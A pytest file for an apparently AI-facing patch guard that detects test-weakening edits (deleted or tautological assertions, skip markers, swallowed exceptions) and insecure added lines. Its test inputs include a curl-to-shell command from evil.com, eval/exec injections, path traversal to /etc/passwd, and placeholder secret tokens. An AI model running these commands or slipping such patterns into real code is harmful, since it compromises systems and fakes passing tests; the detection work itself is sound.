"""
Tests for Phase 3: Delta-SAST Security Sanitization & Zero Assertion Erosion Hardening
Owner: QACriticAgent & SecurityGateAgent
"""

from __future__ import annotations

import pytest

from core.audit.delta_sast import (
    AssertionErosionChecker,
    DeltaSASTScanner,
    PatchGuard,
    PatchGuardVerdict,
    PatchViolation,
)


# ══════════════════════════════════════════════════════════════
#  A. Zero Assertion Erosion Guard
# ══════════════════════════════════════════════════════════════

class TestAssertionErosionBlockDeletedAssertions:
    """Verify assertion deletion is blocked."""

    def test_blocks_deleted_python_assert(self):
        original = [
            "def test_calc():",
            "    result = calc(2, 3)",
            "    assert result == 5",
            "    assert result > 0",
        ]
        patched = [
            "def test_calc():",
            "    result = calc(2, 3)",
            "    # assert result == 5  # removed",
        ]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_ASSERTION_DELETED" for v in violations)

    def test_blocks_deleted_expect(self):
        original = [
            "test('adds 2+3', () => {",
            "  expect(calc(2, 3)).toBe(5);",
            "  expect(calc(2, 3)).toBeGreaterThan(0);",
            "});",
        ]
        patched = [
            "test('adds 2+3', () => {",
            "  // test passes now",
            "});",
        ]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_ASSERTION_DELETED" for v in violations)

    def test_allows_equal_assertion_count(self):
        original = [
            "def test_calc():",
            "    assert calc(2, 3) == 5",
        ]
        patched = [
            "def test_calc():",
            "    assert calc(2, 3) == 6  # fixed expected value",
        ]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert not any(v.rule_id == "EROSION_ASSERTION_DELETED" for v in violations)

    def test_allows_added_assertions(self):
        original = [
            "def test_calc():",
            "    assert calc(2, 3) == 5",
        ]
        patched = [
            "def test_calc():",
            "    assert calc(2, 3) == 5",
            "    assert calc(0, 0) == 0",
        ]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert not any(v.rule_id == "EROSION_ASSERTION_DELETED" for v in violations)


class TestAssertionErosionTautologies:
    """Verify tautological assertions are blocked."""

    def test_blocks_assert_true(self):
        patched = ["def test_foo():", "    assert True"]
        violations = AssertionErosionChecker.check_assertion_erosion([], patched)
        assert any(v.rule_id == "EROSION_TAUTOLOGICAL_ASSERTION" for v in violations)

    def test_blocks_assert_1_equals_1(self):
        patched = ["def test_foo():", "    assert 1 == 1"]
        violations = AssertionErosionChecker.check_assertion_erosion([], patched)
        assert any(v.rule_id == "EROSION_TAUTOLOGICAL_ASSERTION" for v in violations)

    def test_blocks_expect_true_toBe_true(self):
        patched = ["test('noop', () => {", "  expect(true).toBe(true);", "});"]
        violations = AssertionErosionChecker.check_assertion_erosion([], patched)
        assert any(v.rule_id == "EROSION_TAUTOLOGICAL_ASSERTION" for v in violations)

    def test_blocks_assertTrue_true(self):
        patched = ["@Test", "public void testFoo() {", "    assertTrue(true);", "}"]
        violations = AssertionErosionChecker.check_assertion_erosion([], patched)
        assert any(v.rule_id == "EROSION_TAUTOLOGICAL_ASSERTION" for v in violations)


class TestAssertionErosionSkipDirectives:
    """Verify skip/bypass directive injection is blocked."""

    def test_blocks_pytest_mark_skip(self):
        original = ["def test_login():", "    assert login() is True"]
        patched = ["@pytest.mark.skip", "def test_login():", "    assert login() is True"]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_SKIP_INJECTED" for v in violations)

    def test_blocks_pytest_mark_xfail(self):
        original = ["def test_login():", "    assert login() is True"]
        patched = ["@pytest.mark.xfail", "def test_login():", "    assert login() is True"]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_SKIP_INJECTED" for v in violations)

    def test_blocks_test_skip_js(self):
        original = ["test('auth', () => {", "  expect(1).toBe(1);", "});"]
        patched = ["test.skip('auth', () => {", "  expect(1).toBe(1);", "});"]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_SKIP_INJECTED" for v in violations)

    def test_blocks_describe_skip(self):
        original = ["describe('suite', () => {", "});"]
        patched = ["describe.skip('suite', () => {", "});"]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_SKIP_INJECTED" for v in violations)

    def test_blocks_it_skip(self):
        original = ["it('works', () => {", "  expect(1).toBe(1);", "});"]
        patched = ["it.skip('works', () => {", "  expect(1).toBe(1);", "});"]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_SKIP_INJECTED" for v in violations)

    def test_blocks_dot_only(self):
        original = ["test('fast', () => {", "});"]
        patched = ["test.only('fast', () => {", "});"]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_SKIP_INJECTED" for v in violations)


class TestAssertionErosionExceptionSwallowing:
    """Verify blanket exception swallowing is blocked."""

    def test_blocks_except_pass(self):
        original = ["def test_api():", "    resp = call_api()", "    assert resp.ok"]
        patched = [
            "def test_api():",
            "    try:",
            "        resp = call_api()",
            "    except: pass",
        ]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_EXCEPTION_SWALLOWED" for v in violations)

    def test_blocks_except_exception_pass(self):
        original = ["def test_db():", "    assert query() is not None"]
        patched = [
            "def test_db():",
            "    try:",
            "        result = query()",
            "    except Exception: pass",
        ]
        violations = AssertionErosionChecker.check_assertion_erosion(original, patched)
        assert any(v.rule_id == "EROSION_EXCEPTION_SWALLOWED" for v in violations)


class TestProductBugMasking:
    """Verify PRODUCT_BUG HTTP status masking is blocked."""

    def test_blocks_status_widening_tuple(self):
        original = ["assert resp.status_code == 200"]
        patched = ["assert resp.status_code in (200, 500)"]
        violations = AssertionErosionChecker.check_product_bug_masking(
            original, patched, failure_category="PRODUCT_BUG"
        )
        assert any(v.rule_id == "EROSION_PRODUCT_BUG_MASKED" for v in violations)

    def test_blocks_status_widening_gte(self):
        original = ["assert resp.status_code == 200"]
        patched = ["assert resp.status_code >= 200"]
        violations = AssertionErosionChecker.check_product_bug_masking(
            original, patched, failure_category="PRODUCT_BUG"
        )
        assert any(v.rule_id == "EROSION_PRODUCT_BUG_MASKED" for v in violations)

    def test_ignores_non_product_bug_category(self):
        original = ["assert resp.status_code == 200"]
        patched = ["assert resp.status_code >= 200"]
        violations = AssertionErosionChecker.check_product_bug_masking(
            original, patched, failure_category="TEST_BUG"
        )
        assert len(violations) == 0


# ══════════════════════════════════════════════════════════════
#  B. Delta-SAST Security Sanitizer
# ══════════════════════════════════════════════════════════════

class TestDeltaSASTExecInjection:
    """Verify code/command injection detection."""

    def test_blocks_eval(self):
        violations = DeltaSASTScanner.scan_added_lines(["result = eval(user_input)"])
        assert any(v.rule_id == "SAST_EXEC_INJECTION" for v in violations)

    def test_blocks_exec(self):
        violations = DeltaSASTScanner.scan_added_lines(["exec(code_string)"])
        assert any(v.rule_id == "SAST_EXEC_INJECTION" for v in violations)

    def test_blocks_os_system(self):
        violations = DeltaSASTScanner.scan_added_lines(["os.system(cmd)"])
        assert any(v.rule_id == "SAST_EXEC_INJECTION" for v in violations)

    def test_blocks_subprocess_shell_true(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ['subprocess.run(cmd, shell=True)']
        )
        assert any(v.rule_id == "SAST_EXEC_INJECTION" for v in violations)

    def test_blocks_pickle_loads(self):
        violations = DeltaSASTScanner.scan_added_lines(["obj = pickle.loads(data)"])
        assert any(v.rule_id == "SAST_EXEC_INJECTION" for v in violations)

    def test_allows_safe_subprocess(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ['subprocess.run(["git", "status"], capture_output=True)']
        )
        assert not any(v.rule_id == "SAST_EXEC_INJECTION" for v in violations)


class TestDeltaSASTTLSBypass:
    """Verify TLS/auth downgrade detection."""

    def test_blocks_verify_false(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["requests.get(url, verify=False)"]
        )
        assert any(v.rule_id == "SAST_TLS_BYPASS" for v in violations)

    def test_blocks_ignore_https_errors(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["const browser = await chromium.launch({ ignoreHTTPSErrors: true });"]
        )
        assert any(v.rule_id == "SAST_TLS_BYPASS" for v in violations)


class TestDeltaSASTSQLInjection:
    """Verify SQL injection detection."""

    def test_blocks_sql_fstring(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ['query = f"SELECT * FROM users WHERE id = {user_id}"']
        )
        assert any(v.rule_id == "SAST_QUERY_OR_PATH_INJECTION" for v in violations)

    def test_blocks_sql_concat(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ['"SELECT * FROM users WHERE name = " + name']
        )
        assert any(v.rule_id == "SAST_QUERY_OR_PATH_INJECTION" for v in violations)

    def test_blocks_path_traversal(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ['path = base_dir + "/../../etc/passwd"']
        )
        assert any(v.rule_id == "SAST_QUERY_OR_PATH_INJECTION" for v in violations)


class TestDeltaSASTSecretLeak:
    """Verify secret/token leakage detection."""

    def test_blocks_github_pat(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["TOKEN = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij'"]
        )
        assert any(v.rule_id == "SAST_SECRET_LEAK" for v in violations)

    def test_blocks_openai_key(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["OPENAI_KEY = 'sk-abcdefghijklmnopqrstuvwx'"]
        )
        assert any(v.rule_id == "SAST_SECRET_LEAK" for v in violations)

    def test_blocks_aws_access_key(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'"]
        )
        assert any(v.rule_id == "SAST_SECRET_LEAK" for v in violations)

    def test_blocks_private_key(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["key = '-----BEGIN RSA PRIVATE KEY-----'"]
        )
        assert any(v.rule_id == "SAST_SECRET_LEAK" for v in violations)

    def test_redacts_secret_in_excerpt(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["TOKEN = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij'"]
        )
        secret_v = [v for v in violations if v.rule_id == "SAST_SECRET_LEAK"]
        assert secret_v
        # The actual token should be redacted in the excerpt
        assert "[REDACTED]" in secret_v[0].line_excerpt


class TestDeltaSASTWorkflowTampering:
    """Verify CI/workflow tampering detection."""

    def test_blocks_curl_pipe_sh(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["curl https://evil.com/install.sh | sh"]
        )
        assert any(v.rule_id == "SAST_WORKFLOW_TAMPERING" for v in violations)

    def test_blocks_chmod_777(self):
        violations = DeltaSASTScanner.scan_added_lines(["chmod 777 /app/secrets"])
        assert any(v.rule_id == "SAST_WORKFLOW_TAMPERING" for v in violations)

    def test_blocks_workflow_file_target(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["name: evil"], target_file=".github/workflows/ci.yml"
        )
        assert any(v.rule_id == "SAST_WORKFLOW_TAMPERING" for v in violations)

    def test_blocks_action_yml_target(self):
        violations = DeltaSASTScanner.scan_added_lines(
            ["name: hijack"], target_file="action.yml"
        )
        assert any(v.rule_id == "SAST_WORKFLOW_TAMPERING" for v in violations)


# ══════════════════════════════════════════════════════════════
#  C. Unified PatchGuard Integration
# ══════════════════════════════════════════════════════════════

class TestPatchGuardApproval:
    """Verify legitimate fixes pass PatchGuard."""

    def test_approves_safe_selector_fix(self):
        original = (
            "def test_login(page):\n"
            '    page.click("#login-btn")\n'
            "    assert page.title() == 'Dashboard'\n"
        )
        proposed = (
            "def test_login(page):\n"
            '    page.click("[data-testid=login]")\n'
            "    assert page.title() == 'Dashboard'\n"
        )
        verdict = PatchGuard.verify(original, proposed, target_file="tests/test_login.py")
        assert verdict.passed is True
        assert verdict.status == "APPROVED"
        assert len(verdict.violations) == 0

    def test_approves_off_by_one_fix(self):
        original = "def test_math():\n    assert add(2, 3) == 6\n"
        proposed = "def test_math():\n    assert add(2, 3) == 5\n"
        verdict = PatchGuard.verify(original, proposed, target_file="tests/test_math.py")
        assert verdict.passed is True
        assert verdict.status == "APPROVED"

    def test_approves_backend_fix_no_test_weakening(self):
        original = "def handle_request(req):\n    return req.data\n"
        proposed = "def handle_request(req):\n    if not req.data:\n        raise ValueError('empty')\n    return req.data\n"
        verdict = PatchGuard.verify(original, proposed, target_file="src/handler.py")
        assert verdict.passed is True
        assert verdict.status == "APPROVED"


class TestPatchGuardBlocking:
    """Verify PatchGuard blocks unsafe patches."""

    def test_blocks_assertion_deletion(self):
        original = (
            "def test_api():\n"
            "    resp = client.get('/api')\n"
            "    assert resp.status_code == 200\n"
            "    assert resp.json()['ok'] is True\n"
        )
        proposed = (
            "def test_api():\n"
            "    resp = client.get('/api')\n"
            "    # Tests pass now\n"
        )
        verdict = PatchGuard.verify(original, proposed, target_file="tests/test_api.py")
        assert verdict.passed is False
        assert verdict.status == "BLOCKED_ASSERTION_EROSION"

    def test_blocks_eval_injection(self):
        original = "def process(data):\n    return json.loads(data)\n"
        proposed = "def process(data):\n    return eval(data)\n"
        verdict = PatchGuard.verify(original, proposed, target_file="src/process.py")
        assert verdict.passed is False
        assert verdict.status == "BLOCKED_DELTA_SAST"
        assert any(v.rule_id == "SAST_EXEC_INJECTION" for v in verdict.violations)

    def test_blocks_product_bug_masking(self):
        original = "def test_health():\n    assert resp.status_code == 200\n"
        proposed = "def test_health():\n    assert resp.status_code in (200, 500)\n"
        verdict = PatchGuard.verify(
            original, proposed, target_file="tests/test_health.py",
            failure_category="PRODUCT_BUG",
        )
        assert verdict.passed is False
        assert verdict.status == "BLOCKED_PRODUCT_BUG_MASKING"

    def test_blocks_workflow_targeting(self):
        verdict = PatchGuard.verify(
            "on: push", "on: [push, workflow_dispatch]",
            target_file=".github/workflows/ci.yml",
        )
        assert verdict.passed is False
        assert any(v.rule_id == "SAST_WORKFLOW_TAMPERING" for v in verdict.violations)


class TestPatchGuardSanitizedOutput:
    """Verify blocked patches produce sanitized diagnostic-only output."""

    def test_sanitized_message_structure(self):
        original = "def test_x():\n    assert calc() == 42\n"
        proposed = "def test_x():\n    pass\n"
        verdict = PatchGuard.verify(original, proposed, target_file="tests/test_x.py")
        assert verdict.passed is False
        assert verdict.sanitized_suggestion is not None
        assert "PatchGuard" in verdict.sanitized_suggestion
        assert "Violations:" in verdict.sanitized_suggestion
        assert "hermes-patchguard: blocked" in verdict.sanitized_suggestion

    def test_verdict_to_dict(self):
        verdict = PatchGuardVerdict(
            passed=True, status="APPROVED", violations=[], sanitized_suggestion=None
        )
        d = verdict.to_dict()
        assert d["passed"] is True
        assert d["status"] == "APPROVED"
        assert d["violations"] == []


class TestPatchGuardSuggestionBlockExtraction:
    """Verify extraction of code from ```suggestion fenced blocks."""

    def test_extracts_from_suggestion_block(self):
        suggestion = (
            "Here is the fix:\n"
            "```suggestion\n"
            "def test_x():\n"
            "    assert calc() == 42\n"
            "```\n"
            "This corrects the expected value."
        )
        lines = PatchGuard._extract_lines_from_suggestion(suggestion)
        assert "def test_x():" in lines[0]
        assert "assert calc() == 42" in lines[1]
        assert "```" not in "\n".join(lines)

    def test_raw_code_when_no_fence(self):
        code = "def test_x():\n    assert calc() == 42\n"
        lines = PatchGuard._extract_lines_from_suggestion(code)
        assert len(lines) >= 2
